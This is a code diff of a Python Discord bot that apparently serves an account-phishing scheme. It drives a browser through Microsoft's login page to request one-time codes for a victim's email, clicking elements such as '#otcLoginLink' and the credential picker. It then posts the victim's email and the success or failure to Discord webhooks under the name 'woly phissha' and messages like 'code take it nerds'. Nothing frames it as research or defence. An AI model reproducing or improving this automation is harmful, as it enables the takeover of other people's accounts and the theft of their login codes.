@@ -102,7 +102,7 @@ class MyModal(discord.ui.Modal):
                   url = id_and_url[1]
                   break
         #print(url)
-        requests.post(url, json = {
+        requests.post(url=url, json = {
   "username": "woly phissha",
   "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
   "content": "@everyone idk what im doing",
@@ -177,8 +177,14 @@ async def requestcode(interaction):
         try:
           await page.wait_for_selector('#otcLoginLink', state='visible', timeout=5000)
           await page.click('#otcLoginLink')
+          await page.close()
+          requests.post(url=url, json = {
+            "username": "woly phissha",
+            "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
+            "content": f"Sucessfully got code from {email}"
+          })
         except Exception as e:
-          requests.post(url, json = {
+          requests.post(url=url, json = {
             "username": "woly phissha",
             "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
             "content": f"Wasent able to retrieve code from {email} normal way. Trying different metheod"
@@ -187,17 +193,19 @@ async def requestcode(interaction):
             await page.wait_for_selector('#idA_PWD_SwitchToCredPicker', state='visible')
             await page.click('#idA_PWD_SwitchToCredPicker', timeout=2000)
             await page.click(f'text=Email {email}')
-            requests.post(url, json = {
+            requests.post(url=url, json = {
               "username": "woly phissha",
               "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
               "content": f"@everyone Successfully got code from {email}"
             })
+            await page.close()
           except Exception as e:
-              requests.post(url, json = {
+            requests.post(url=url, json = {
                 "username": "woly phissha",
                 "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
                 "content": f"@everyone COULDN'T GET CODE FROM: {email}"
             }, timeout=5000)
+            await page.close()
 
 
 
@@ -244,7 +252,7 @@ class MyModal2(discord.ui.Modal):
                   url = id_and_url[1]
                   break
 
-        requests.post(url, json ={
+        requests.post(url=url, json ={
   "username": "code hehe",
   "avatar_url": "https://media.discordapp.net/attachments/1087806512442900491/1087813733134381066/0518a2a092bfdc95593b76aead97f220.jpg",
   "content": "@everyone code take it nerds",
